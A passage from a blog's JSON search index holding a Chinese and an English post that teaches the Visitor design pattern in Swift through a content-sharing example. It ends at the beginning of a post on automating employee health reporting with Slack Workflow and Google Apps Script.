Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 220 Total Views Last Statistics Date: 2025-08-15 | 193 Views on Medium." }, { "title": "Visitor Pattern in iOS (Swift)", "url": "/posts/zrealm-dev/visitor-pattern-in-ios-swift-ba5773a7bfea/", "categories": "ZRealm Dev.", "tags": "ios-app-development, swift, design-patterns, visitor-pattern, double-dispatch", "date": "2021-06-15 23:58:36 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Visitor Pattern in Swift (Share Object to XXX Example)Visitor Pattern 的實際應用場景分析 (在分享 商品、歌曲、文章… 到 Facebook, Line, ...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Visitor Pattern in Swift (Share Object to XXX Example)Visitor Pattern 的實際應用場景分析 (在分享 商品、歌曲、文章… 到 Facebook, Line, Linkedin. . 場景)Photo by Daniel McCullough前言「Design Pattern」從知道有這個東西到現在也超過 10 年了依然沒辦法有自信的說能完全掌握，一直以來都是矇矇懂懂的，也好幾次從頭到尾把所有模式都看過一遍，但看了沒內化、沒在實務上應用很快就忘了。 我真的廢。內功與招式曾經看到的一個很好的比喻 ，招式部分如：PHP、Laravel、iOS、Swift、SwiftUI…之類的應用，其實在其中切換學習門檻都不算高；但內功部分如：演算法、資料結構、設計模式…等等都屬於內功；內功與招式之間有著相輔相成的效果；但是招式好學，內功難練；招式厲害的內功不一定厲害，內功厲害的也可以很快學會招式，所以與其說相輔相成不如說內功才是基礎，搭配招式才能所向披靡。找到適合自己的學習方式基於之前的學習經驗，我認為適合我自己的學習 Design Pattern 方式是 — 先精再通；先著重於精通幾個模式，要能內化跟靈活運用，還要培養出嗅覺，能判斷什麼場景適合什麼場景不適合；再一步一步的累積新模式，直到全部掌握；我覺得最好的方式就是多找實務場境，從應用中學習。學習資源推薦兩個免費的學習資源 https://refactoringguru.cn/ ：完整介紹所有模式結構、場景、相互關係 https://shirazian.wordpress.com/2016/04/11/design-patterns-in-swift/ ：作者以實際開發 iOS 的場景介紹更個模式的應用，本文也會以這個方向撰寫Visitor — Behavioral Patterns第一章紀錄的是 Visitor Pattern，這也是在街聲工作一年挖到的金礦之一，在 StreetVoice App 中有諸多善用 Visitor 解決架構問題的地方；我也在這段經歷之中席的了 Visitor 的原理精髓；所以第一章就來寫它！Visitor 是什麼首先請先了解 Visitor 是什麼？想要解決什麼問題？組成結構是什麼？圖片取自 refactoringguru詳細內容這邊不再重複贅述，請先直接參考 refactoringguru 對於 Visitor 的講解 。iOS 實務場景 — 分享功能假設今天我們有以下幾個 Model：UserModel、SongModel、PlaylistModel 這三個 Model，現在我們要實作分享功能，可以分享到：Facebook、Line、Instagram，這三個平台；每個 Model 需要呈現的分享訊息皆為不同、每個平台需要的資料也各有不同：組合場景如上圖，第一個表格顯示各 Model 的客製化內容、第二個表格顯示各分享平台需要的資料。 尤其 Instagram 在分享 Playlist 時要多張圖片，跟其他分享要的 source 不一樣。定義 Model首先把各個 Model 有哪些 Property 定義完成：// Modelstruct UserModel { let id: String let name: String let profileImageURLString: String}struct SongModel { let id: String let name: String let user: UserModel let coverImageURLString: String}struct PlaylistModel { let id: String let name: String let user: UserModel let songs: [SongModel] let coverImageURLString: String}// Datalet user = UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\")let song = SongModel(id: \"1\", name: \"Wake me up\", user: user, coverImageURLString: \"https://zhgchg.li/cover/1.png\")let playlist = PlaylistModel(id: \"1\", name: \"Avicii Tribute Concert\", user: user, songs: [ song, SongModel(id: \"2\", name: \"Waiting for love\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/3.png\"), SongModel(id: \"3\", name: \"Lonely Together\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/1.png\"), SongModel(id: \"4\", name: \"Heaven\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/4.png\"), SongModel(id: \"5\", name: \"S.O.S\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/5.png\")], coverImageURLString: \"https://zhgchg.li/playlist/1.png\")什麼都沒想的做法完全不考慮架構，先上一個什麼都沒想的最髒做法。周星馳 — 食神class ShareManager { private let title: String private let urlString: String private let imageURLStrings: [String] init(user: UserModel) { self.title = \"Hi 跟你分享一位很讚的藝人\\(user.name)。\" self.urlString = \"https://zhgchg.li/user/\\(user.id)\" self.imageURLStrings = [user.profileImageURLString] } init(song: SongModel) { self.title = \"Hi 與你分享剛剛聽到一首很讚的歌，\\(song.user.name) 的 \\(song.name)。\" self.urlString = \"https://zhgchg.li/user/\\(song.user.id)/song/\\(song.id)\" self.imageURLStrings = [song.coverImageURLString] } init(playlist: PlaylistModel) { self.title = \"Hi 這個歌單我聽個不停 \\(playlist.name)。\" self.urlString = \"https://zhgchg.li/user/\\(playlist.user.id)/playlist/\\(playlist.id)\" self.imageURLStrings = playlist.songs.map({ $0.coverImageURLString }) } func shareToFacebook() { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![\\(self.title)](\\(String(describing: self.imageURLStrings.first))](\\(self.urlString))\") } func shareToInstagram() { // call Instagram share sdk... print(\"Share to Instagram...\") print(self.imageURLStrings.joined(separator: \",\")) } func shareToLine() { // call Line share sdk... print(\"Share to Line...\") print(\"[\\(self.title)](\\(self.urlString))\") }}沒啥好說的，就是 0 架構全攪和在一起，如果今天要新加一個分享平台、更改某個平台的分享資訊、增加一個可分享的 Model 都要動到 ShareManager；另外 imageURLStrings 的設計因是考量到 Instagram 在分享歌單時需要圖片組資料所以才宣告成陣列，這有點倒因為果變成照需求去設計架構，其他不需要圖片組的類型也遭到污染。優化一下稍微分離一下邏輯。protocol Shareable { func getShareText() -&gt; String func getShareURLString() -&gt; String func getShareImageURLStrings() -&gt; [String]}extension UserModel: Shareable { func getShareText() -&gt; String { return \"Hi 跟你分享一位很讚的藝人\\(self.name)。\" } func getShareURLString() -&gt; String { return \"https://zhgchg.li/user/\\(self.id)\" } func getShareImageURLStrings() -&gt; [String] { return [self.profileImageURLString] }}extension SongModel: Shareable { func getShareText() -&gt; String { return \"Hi 與你分享剛剛聽到一首很讚的歌，\\(self.user.name) 的 \\(self.name)。\" } func getShareURLString() -&gt; String { return \"https://zhgchg.li/user/\\(self.user.id)/song/\\(self.id)\" } func getShareImageURLStrings() -&gt; [String] { return [self.coverImageURLString] }}extension PlaylistModel: Shareable { func getShareText() -&gt; String { return \"Hi 這個歌單我聽個不停 \\(self.name)。\" } func getShareURLString() -&gt; String { return \"https://zhgchg.li/user/\\(self.user.id)/playlist/\\(self.id)\" } func getShareImageURLStrings() -&gt; [String] { return [self.coverImageURLString] }}protocol ShareManagerProtocol { var model: Shareable { get } init(model: Shareable) func share()}class FacebookShare: ShareManagerProtocol { let model: Shareable required init(model: Shareable) { self.model = model } func share() { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![\\(model.getShareText())](\\(String(describing: model.getShareImageURLStrings().first))](\\(model.getShareURLString())\") }}class InstagramShare: ShareManagerProtocol { let model: Shareable required init(model: Shareable) { self.model = model } func share() { // call Instagram share sdk... print(\"Share to Instagram...\") print(model.getShareImageURLStrings().joined(separator: \",\")) }}class LineShare: ShareManagerProtocol { let model: Shareable required init(model: Shareable) { self.model = model } func share() { // call Line share sdk... print(\"Share to Line...\") print(\"[\\(model.getShareText())](\\(model.getShareURLString())\") }}我們抽離出一個 CanShare Protocol，凡是 Model 有遵循這個協議都能支援分享；分享的部分也抽離出 ShareManagerProtocol，有新的分享只要實現協議內容即可、要修改刪除也都不會影響其他 ShareManager。但 getShareImageURLStrings 依然詭異，另外假設今天新增的分享平台需求的 Model 資料天壤之別，例如微信分享還需要播放次數、創建日期…等資訊，只有他要，這時候就會開始變得混亂。Visitor使用 Visitor Pattern 的解法。// Visitor Versionprotocol Shareable { func accept(visitor: SharePolicy)}extension UserModel: Shareable { func accept(visitor: SharePolicy) { visitor.visit(model: self) }}extension SongModel: Shareable { func accept(visitor: SharePolicy) { visitor.visit(model: self) }}extension PlaylistModel: Shareable { func accept(visitor: SharePolicy) { visitor.visit(model: self) }}protocol SharePolicy { func visit(model: UserModel) func visit(model: SongModel) func visit(model: PlaylistModel)}class ShareToFacebookVisitor: SharePolicy { func visit(model: UserModel) { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![Hi 跟你分享一位很讚的藝人\\(model.name)。](\\(model.profileImageURLString)](https://zhgchg.li/user/\\(model.id)\") } func visit(model: SongModel) { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![Hi 與你分享剛剛聽到一首很讚的歌，\\(model.user.name) 的 \\(model.name)，他被播方式。](\\(model.coverImageURLString))](https://zhgchg.li/user/\\(model.user.id)/song/\\(model.id)\") } func visit(model: PlaylistModel) { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![Hi 這個歌單我聽個不停 \\(model.name)。](\\(model.coverImageURLString))](https://zhgchg.li/user/\\(model.user.id)/playlist/\\(model.id)\") }}class ShareToLineVisitor: SharePolicy { func visit(model: UserModel) { // call Line share sdk... print(\"Share to Line...\") print(\"[Hi 跟你分享一位很讚的藝人\\(model.name)。](https://zhgchg.li/user/\\(model.id)\") } func visit(model: SongModel) { // call Line share sdk... print(\"Share to Line...\") print(\"[Hi 與你分享剛剛聽到一首很讚的歌，\\(model.user.name) 的 \\(model.name)，他被播方式。]](https://zhgchg.li/user/\\(model.user.id)/song/\\(model.id)\") } func visit(model: PlaylistModel) { // call Line share sdk... print(\"Share to Line...\") print(\"[Hi 這個歌單我聽個不停 \\(model.name)。](https://zhgchg.li/user/\\(model.user.id)/playlist/\\(model.id)\") }}class ShareToInstagramVisitor: SharePolicy { func visit(model: UserModel) { // call Instagram share sdk... print(\"Share to Instagram...\") print(model.profileImageURLString) } func visit(model: SongModel) { // call Instagram share sdk... print(\"Share to Instagram...\") print(model.coverImageURLString) } func visit(model: PlaylistModel) { // call Instagram share sdk... print(\"Share to Instagram...\") print(model.songs.map({ $0.coverImageURLString }).joined(separator: \",\")) }}// Use caselet shareToInstagramVisitor = ShareToInstagramVisitor()user.accept(visitor: shareToInstagramVisitor)playlist.accept(visitor: shareToInstagramVisitor)我們逐行來看做了什麼： 首先我們創建了一個 Shareable 的 Protocol，其目的只是方便我們管理 Model 支援分享 Visitor 有統一的接口 (不定義也行)。 UserModel/SongModel/PlaylistModel 實現 Shareable func accept(visitor: SharePolicy) ，之後如果有新增支援分享的 Model 也只需實現協議 定義出 SharePolicy 列出所支援的 Model(must be concrete type) 或許你會想為何不定義成 visit(model: Shareable) 如果是這樣就重蹈上一版的問題了 各個 Share 方法實現 SharePolicy，各自依照 source 去組合需要的資源 假設今天多一個微信分享，他要的資料比較特別(播放次數、創建日期)，也不會影響現有程式碼，因為他能從 concrete model 拿到他自己需要的資訊。達成低耦合、高聚合的程式開發目標。以上是經典的 Visitor Double Dispatch 實現，但我們日常開發上比較少會遇到這種狀況，一般常見的狀況可能只會有一個 Visitor，但我覺得也很適合使用這套模式組合，例如今天有一個 SaveToCoreData 的需求，我們也可以直接定義 accept(visitor: SaveToCoreDataVisitor) ，不多宣告出 Policy Protocol，也是個很好的使用架構。protocol Saveable { func accept(visitor: SaveToCoreDataVisitor)}class SaveToCoreDataVisitor { func visit(model: UserModel) { // map UserModel to coredata } func visit(model: SongModel) { // map SongModel to coredata } func visit(model: PlaylistModel) { // map PlaylistModel to coredata }}其他應用：Save、Like、tableview/collectionview cellforrow….原則最後講一下一些共通原則 Code 是給人讀的，切勿 Over Designed 統一很重要，同樣的場境同個 Codebase 應該使用同個架構方法 如果範圍是可控的或不可能出現其他狀況，這時候如果還繼續往下拆分就可以認為是 Over Designed 多應用、少發明；Design Pattern 已經在軟體設計領域好幾十年，他所考量到的場景一定比我們創造一個新的架構還來的完善 看不懂 Design Pattern 可以學，但如果是自己創造的架構就比較難說服別人學，因為學了可能也只能用在這個 Case 上，他就不是一個 Common sense 程式碼重複不代表不好，如果一昧追求封裝可能導致 Over Designed；一樣回到前面幾點，程式是給人讀的，所以只要是好讀加上低耦合高聚合都是好的 Code 勿魔改 Pattern，人家設計一定有他的道理，如果亂魔改可能導致某些場景出現問題 只要開始繞路就會越繞越遠，程式會越來越髒 inspired by ＠saiday參考資料 Design Patterns in Swift: Visitor (另一個使用 Visitor 的場景應用) https://github.com/kingreza/Swift-Visitor Deep Linking at Scale on iOS (State Pattern)延伸閱讀 Design Patterns 的實戰應用紀錄 — In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern Design Patterns 的實戰應用紀錄 Visitor Pattern in TableView有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,112 Total Views Last Statistics Date: 2025-08-15 | 1,077 Views on Medium." }, { "title": "Visitor Pattern in iOS (Swift)", "url": "/posts/zrealm-dev/en/visitor-pattern-in-ios-swift-ba5773a7bfea/", "categories": "ZRealm Dev.", "tags": "ios-app-development, swift, design-patterns, visitor-pattern, double-dispatch", "date": "2021-06-15 23:58:36 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Visitor Pattern in Swift (Sharing Objects Example)An analysis of the practical appli...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Visitor Pattern in Swift (Sharing Objects Example)An analysis of the practical application of the Visitor Pattern (in sharing products, songs, articles, etc. to platforms like Facebook, Line, LinkedIn…)Photo by Daniel McCulloughIntroductionIt’s been over 10 years since I first learned about “Design Patterns,” and I still can’t confidently say that I fully grasp them. I’ve often skimmed through all the patterns multiple times, but without internalizing or applying them in practice, I quickly forget what I’ve learned. I really feel useless.Skills and TechniquesI once came across a great analogy: the techniques (like PHP, Laravel, iOS, Swift, SwiftUI, etc.) are relatively easy to switch between and learn. However, the foundational skills (like algorithms, data structures, design patterns, etc.) are much harder to master. These foundational skills and techniques complement each other; while techniques are easy to learn, foundational skills are difficult to develop. Just because someone is skilled in techniques doesn’t mean they have strong foundational skills, but those with strong foundational skills can quickly learn techniques. Therefore, rather than saying they complement each other, it’s more accurate to say that foundational skills are the basis, and techniques enhance their effectiveness.Finding a Suitable Learning MethodBased on my previous learning experiences, I believe that the best way for me to learn Design Patterns is to focus on mastering a few patterns first. I need to internalize and apply them flexibly, developing an intuition for which scenarios are suitable for which patterns. Then, I can gradually accumulate new patterns until I master them all. I think the best approach is to seek out practical scenarios and learn from application.Learning ResourcesI recommend two free learning resources: https://refactoringguru.cn/: A comprehensive introduction to all pattern structures, scenarios, and relationships. https://shirazian.wordpress.com/2016/04/11/design-patterns-in-swift/: The author introduces various patterns through actual iOS development scenarios, and this article will also follow that direction.Visitor — Behavioral PatternsThe first chapter documents the Visitor Pattern, which I discovered during my year at StreetVoice. The StreetVoice App has many instances where the Visitor Pattern effectively solves architectural problems. Through this experience, I grasped the essence of the Visitor Pattern, so I decided to write about it in this chapter!What is a Visitor?First, let’s understand what a Visitor is. What problem does it aim to solve? What is its structural composition?Image from refactoringguruI won’t repeat the details here; please refer directly to refactoringguru’s explanation of the Visitor Pattern.iOS Practical Scenario — Sharing FunctionalityLet’s assume we have the following models: UserModel, SongModel, and PlaylistModel. We want to implement a sharing feature that allows sharing to Facebook, Line, and Instagram. Each model needs to present different sharing messages, and each platform requires different data:The combination scenario is shown in the image above. The first table displays the customized content for each model, while the second table shows the data required by each sharing platform. Especially for Instagram, sharing a Playlist requires multiple images, which is different from the data needed for other sharing types.Defining the ModelsFirst, let’s define the properties for each model:// Modelstruct UserModel { let id: String let name: String let profileImageURLString: String}struct SongModel { let id: String let name: String let user: UserModel let coverImageURLString: String}struct PlaylistModel { let id: String let name: String let user: UserModel let songs: [SongModel] let coverImageURLString: String}// Datalet user = UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\")let song = SongModel(id: \"1\", name: \"Wake Me Up\", user: user, coverImageURLString: \"https://zhgchg.li/cover/1.png\")let playlist = PlaylistModel(id: \"1\", name: \"Avicii Tribute Concert\", user: user, songs: [ song, SongModel(id: \"2\", name: \"Waiting for Love\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/3.png\"), SongModel(id: \"3\", name: \"Lonely Together\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/1.png\"), SongModel(id: \"4\", name: \"Heaven\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/4.png\"), SongModel(id: \"5\", name: \"S.O.S\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/5.png\")], coverImageURLString: \"https://zhgchg.li/playlist/1.png\")A Poorly Designed ApproachLet’s start with a very messy implementation that doesn’t consider architecture at all.Stephen Chow — The God of Cookeryclass ShareManager { private let title: String private let urlString: String private let imageURLStrings: [String] init(user: UserModel) { self.title = \"Hi, I want to share a great artist with you: \\(user.name).\" self.urlString = \"https://zhgchg.li/user/\\(user.id)\" self.imageURLStrings = [user.profileImageURLString] } init(song: SongModel) { self.title = \"Hi, I want to share a great song I just heard: \\(song.user.name)'s \\(song.name).\" self.urlString = \"https://zhgchg.li/user/\\(song.user.id)/song/\\(song.id)\" self.imageURLStrings = [song.coverImageURLString] } init(playlist: PlaylistModel) { self.title = \"Hi, I can't stop listening to this playlist: \\(playlist.name).\" self.urlString = \"https://zhgchg.li/user/\\(playlist.user.id)/playlist/\\(playlist.id)\" self.imageURLStrings = playlist.songs.map({ $0.coverImageURLString }) } func shareToFacebook() { // call Facebook share SDK... print(\"Sharing to Facebook...\") print(\"[![\\(self.title)](\\(String(describing: self.imageURLStrings.first))](\\(self.urlString))\") } func shareToInstagram() { // call Instagram share SDK... print(\"Sharing to Instagram...\") print(self.imageURLStrings.joined(separator: \",\")) } func shareToLine() { // call Line share SDK... print(\"Sharing to Line...\") print(\"[\\(self.title)](\\(self.urlString))\") }}There’s not much to say; this is a completely unstructured approach where everything is mixed together. If we want to add a new sharing platform, change the sharing information for a platform, or add a new shareable model, we have to modify the ShareManager. Additionally, the design of imageURLStrings was influenced by the need for multiple images when sharing a playlist on Instagram, which leads to a design that is reactive rather than proactive, polluting other types that don’t require multiple images.A Slight OptimizationLet’s separate the logic a bit.protocol Shareable { func getShareText() -&gt; String func getShareURLString() -&gt; String func getShareImageURLStrings() -&gt; [String]}extension UserModel: Shareable { func getShareText() -&gt; String { return \"Hi, I want to share a great artist with you: \\(self.name).\" } func getShareURLString() -&gt; String { return \"https://zhgchg.li/user/\\(self.id)\" } func getShareImageURLStrings() -&gt; [String] { return [self.profileImageURLString] }}extension SongModel: Shareable { func getShareText() -&gt; String { return \"Hi, I want to share a great song I just heard: \\(self.user.name)'s \\(self.name).\" } func getShareURLString() -&gt; String { return \"https://zhgchg.li/user/\\(self.user.id)/song/\\(self.id)\" } func getShareImageURLStrings() -&gt; [String] { return [self.coverImageURLString] }}extension PlaylistModel: Shareable { func getShareText() -&gt; String { return \"Hi, I can't stop listening to this playlist: \\(self.name).\" } func getShareURLString() -&gt; String { return \"https://zhgchg.li/user/\\(self.user.id)/playlist/\\(self.id)\" } func getShareImageURLStrings() -&gt; [String] { return [self.coverImageURLString] }}protocol ShareManagerProtocol { var model: Shareable { get } init(model: Shareable) func share()}class FacebookShare: ShareManagerProtocol { let model: Shareable required init(model: Shareable) { self.model = model } func share() { // call Facebook share SDK... print(\"Sharing to Facebook...\") print(\"[![\\(model.getShareText())](\\(String(describing: model.getShareImageURLStrings().first))](\\(model.getShareURLString())\") }}class InstagramShare: ShareManagerProtocol { let model: Shareable required init(model: Shareable) { self.model = model } func share() { // call Instagram share SDK... print(\"Sharing to Instagram...\") print(model.getShareImageURLStrings().joined(separator: \",\")) }}class LineShare: ShareManagerProtocol { let model: Shareable required init(model: Shareable) { self.model = model } func share() { // call Line share SDK... print(\"Sharing to Line...\") print(\"[\\(model.getShareText())](\\(model.getShareURLString())\") }}We extracted a Shareable protocol, allowing any model that conforms to this protocol to support sharing. The sharing logic is also separated into a ShareManagerProtocol, so adding new sharing options or modifying existing ones won’t affect other share managers.However, the getShareImageURLStrings method still feels odd. Additionally, if a new sharing platform requires entirely different model data (like WeChat needing play counts or creation dates), it could lead to confusion.Using the Visitor PatternHere’s how we can solve this using the Visitor Pattern.// Visitor Versionprotocol Shareable { func accept(visitor: SharePolicy)}extension UserModel: Shareable { func accept(visitor: SharePolicy) { visitor.visit(model: self) }}extension SongModel: Shareable { func accept(visitor: SharePolicy) { visitor.visit(model: self) }}extension PlaylistModel: Shareable { func accept(visitor: SharePolicy) { visitor.visit(model: self) }}protocol SharePolicy { func visit(model: UserModel) func visit(model: SongModel) func visit(model: PlaylistModel)}class ShareToFacebookVisitor: SharePolicy { func visit(model: UserModel) { // call Facebook share SDK... print(\"Sharing to Facebook...\") print(\"[![Hi, I want to share a great artist with you: \\(model.name).](\\(model.profileImageURLString)](https://zhgchg.li/user/\\(model.id)\") } func visit(model: SongModel) { // call Facebook share SDK... print(\"Sharing to Facebook...\") print(\"[![Hi, I want to share a great song I just heard: \\(model.user.name)'s \\(model.name).](\\(model.coverImageURLString))](https://zhgchg.li/user/\\(model.user.id)/song/\\(model.id)\") } func visit(model: PlaylistModel) { // call Facebook share SDK... print(\"Sharing to Facebook...\") print(\"[![Hi, I can't stop listening to this playlist: \\(model.name).](\\(model.coverImageURLString))](https://zhgchg.li/user/\\(model.user.id)/playlist/\\(model.id)\") }}class ShareToLineVisitor: SharePolicy { func visit(model: UserModel) { // call Line share SDK... print(\"Sharing to Line...\") print(\"[Hi, I want to share a great artist with you: \\(model.name).](https://zhgchg.li/user/\\(model.id)\") } func visit(model: SongModel) { // call Line share SDK... print(\"Sharing to Line...\") print(\"[Hi, I want to share a great song I just heard: \\(model.user.name)'s \\(model.name).](https://zhgchg.li/user/\\(model.user.id)/song/\\(model.id)\") } func visit(model: PlaylistModel) { // call Line share SDK... print(\"Sharing to Line...\") print(\"[Hi, I can't stop listening to this playlist: \\(model.name).](https://zhgchg.li/user/\\(model.user.id)/playlist/\\(model.id)\") }}class ShareToInstagramVisitor: SharePolicy { func visit(model: UserModel) { // call Instagram share SDK... print(\"Sharing to Instagram...\") print(model.profileImageURLString) } func visit(model: SongModel) { // call Instagram share SDK... print(\"Sharing to Instagram...\") print(model.coverImageURLString) } func visit(model: PlaylistModel) { // call Instagram share SDK... print(\"Sharing to Instagram...\") print(model.songs.map({ $0.coverImageURLString }).joined(separator: \",\")) }}// Use caselet shareToInstagramVisitor = ShareToInstagramVisitor()user.accept(visitor: shareToInstagramVisitor)playlist.accept(visitor: shareToInstagramVisitor)Let’s break down what we’ve done: We created a Shareable protocol to manage models that support sharing, providing a unified interface (though it could be left undefined). The UserModel, SongModel, and PlaylistModel implement the accept(visitor: SharePolicy) method, so if we add a new model that supports sharing, we only need to implement this protocol. We defined the SharePolicy protocol, listing the supported models. (It must be a concrete type; you might wonder why we don’t define it as visit(model: Shareable). If we did, we’d fall back into the previous issues.) Each sharing method implements the SharePolicy, combining the necessary resources based on the source. If we were to add a WeChat sharing option that requires different data (like play counts or creation dates), it wouldn’t affect the existing code because it can retrieve the information it needs from the concrete model.This achieves the goal of low coupling and high cohesion in software development.The above is a classic implementation of the Visitor Double Dispatch pattern. However, in everyday development, we might encounter this situation less frequently; typically, there may only be one Visitor. I believe this pattern is also suitable for combining scenarios. For example, if we have a requirement to save to Core Data, we can directly define accept(visitor: SaveToCoreDataVisitor) without needing to declare a separate Policy Protocol, which is also a good architectural approach.protocol Saveable { func accept(visitor: SaveToCoreDataVisitor)}class SaveToCoreDataVisitor { func visit(model: UserModel) { // Map UserModel to Core Data } func visit(model: SongModel) { // Map SongModel to Core Data } func visit(model: PlaylistModel) { // Map PlaylistModel to Core Data }}Other applications: Save, Like, table view/collection view cell for row, etc.PrinciplesLet’s discuss some common principles: Code is meant to be read by people; avoid over-designing. Consistency is crucial; the same codebase should use the same architectural methods in similar scenarios. If the scope is manageable or unlikely to encounter other situations, continuing to break things down further can be considered over-designing. Focus on applying existing solutions rather than inventing new ones; design patterns have been established in software design for decades and are likely to cover more scenarios than a new architecture we create. If you don’t understand a design pattern, it’s worth learning. However, if you create your own architecture, it may be harder to convince others to adopt it, as it might only apply to a specific case and not be common knowledge. Code duplication isn’t inherently bad; overly pursuing encapsulation can lead to over-design. Remember, code should be readable, and good code is characterized by low coupling and high cohesion. Avoid modifying patterns arbitrarily; there are reasons behind their design, and random changes can lead to issues in certain scenarios. Once you start deviating from a clear path, it becomes increasingly difficult to return, and the code can become messier. inspired by ＠saidayReferences Design Patterns in Swift: Visitor (Another application of the Visitor pattern) https://github.com/kingreza/Swift-Visitor Deep Linking at Scale on iOS (State Pattern)Further Reading Practical applications of Design Patterns — In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern Practical applications of Design Patterns Visitor Pattern in TableViewIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,112 Total Views Last Statistics Date: 2025-08-15 | 1,077 Views on Medium." }, { "title": "Slack 打造全自動 WFH 員工健康狀況回報系統", "url": "/posts/zrealm-dev/slack-%E6%89%93%E9%80%A0%E5%85%A8%E8%87%AA%E5%8B%95-wfh-%E5%93%A1%E5%B7%A5%E5%81%A5%E5%BA%B7%E7%8B%80%E6%B3%81%E5%9B%9E%E5%A0%B1%E7%B3%BB%E7%B5%B1-d61062833c1a/", "categories": "ZRealm Dev.", "tags": "ios-app-development, automation, google-sheets, app-script, slack", "date": "2021-06-14 00:58:21 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Slack 打造全自動 WFH 員工健康狀況回報系統玩轉 Slack Workflow 搭配 Google Sheet with App Script 增加工作效率Photo by Stephen Phillips — Hos...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Slack 打造全自動 WFH 員工健康狀況回報系統玩轉 Slack Workflow 搭配 Google Sheet with App Script 增加工作效率Photo by Stephen Phillips — Hostreviews.co.uk前言因應全面居家工作，公司關心所有成員的健康，每日均需回報身體有無狀況並由 People Operations 統一紀錄管理。我們的 優化前 的 Flow [自動化] Slack Channel 每日早上 10 點定時發送提醒大家健康表單的訊息(優化前唯一自動化的地方) 員工點擊連結打開 Google Form 填寫健康問題 資料存回 Google Sheet 回應紀錄 [人工] People Operations 於每日接近下班時比對名單篩出忘記填寫的員工 [人工] 於 Slack Channel 發送填寫提醒訊息 &amp; 一個一個 tag 忘記填寫的人 以上是敝司的健康回報追蹤流程，每間公司依照規模及運作方式一定有所不同，本文僅以此做為優化範例，學習 Slack Workflow 使用、基本 App Script 撰寫，實際還是要 by case 實作。問題點 需跳出 Slack Context 使用瀏覽器打開 Google Form 網頁才能填寫，尤其在手機上更不方便 Google Form 僅能自動帶入 Email 訊息，無法自動加上填寫人名稱、部門資訊 每日人工比對、人工 tag 非常花費人力時間解決方案做過蠻多自動化的小東西，這個流程資料源固定(員工名單)、條件單純、動作很例行；一看就覺得很適合自動化，一開始沒做是因為找不到好的填寫方式(實際是找不到有趣可研究的點)；所以也就放著沒管，直到看到 海總理的這則 PO 文 才發現 Slack Workflow 不只是可以做定時傳訊息，還有 Form 表單的功能：圖片取自： 海總理這下手就開始癢了啊！！如果能搭配 Slack Workflow From 加上傳訊息的自動化，豈不是能解決上面提到的 所有痛點 ，原理可行！於是開始著手實作。優化後 的 Flow首先上一下優化後的流程及結果。 [自動化] Slack Channel 每日早上 10 點定時發送提醒大家健康表單的訊息 從 Google Form 或 Slack Workflow Form 填寫健康問題 資料均存回 Google Sheet 回應紀錄 People Operations 於每日接近下班時點擊「產生未填寫名單」按鈕 [自動化] 使用 App Script 比對員工名單、填寫名單篩出未填寫名單 [自動化] 點擊「產生＆發送訊息」自動發送未填寫提醒＆自動 tag 對象 收工！成效(個人預估) 填寫時間每位員工每日能減少約 30 秒 People Operations 處理這件事每日能減少約 20 ~ 30 分鐘運作原理透過撰寫 App Script 來管理 Sheet。 將外部輸入的資料都存放在 Responses Sheet 撰寫 App Script Function 將 Responses 的資料依照填寫日期分發到各日期的 Sheet，若無則建立新的日期 Sheet，Sheet 名稱直接使用日期，方便辨識取用 取得當前日期的 Sheet 與員工名單比對，產生未填寫名單 Sheet 的資料 讀取未填寫名單 Sheet 組合出訊息並發送到指定 Slack Channel 串接 Slack APP API 可自動讀取指定 Channel 匯入員工名單 訊息內容使用 Slack UID Tag &lt;@UID&gt; 就能標記未填寫的成員。身份識別串起 Google From 與 Slack 的身份識別資訊是 Email，所以請確保公司同仁都是使用公司 Email 填寫 Google Form、Slack 個人資訊部分也都有填寫公司 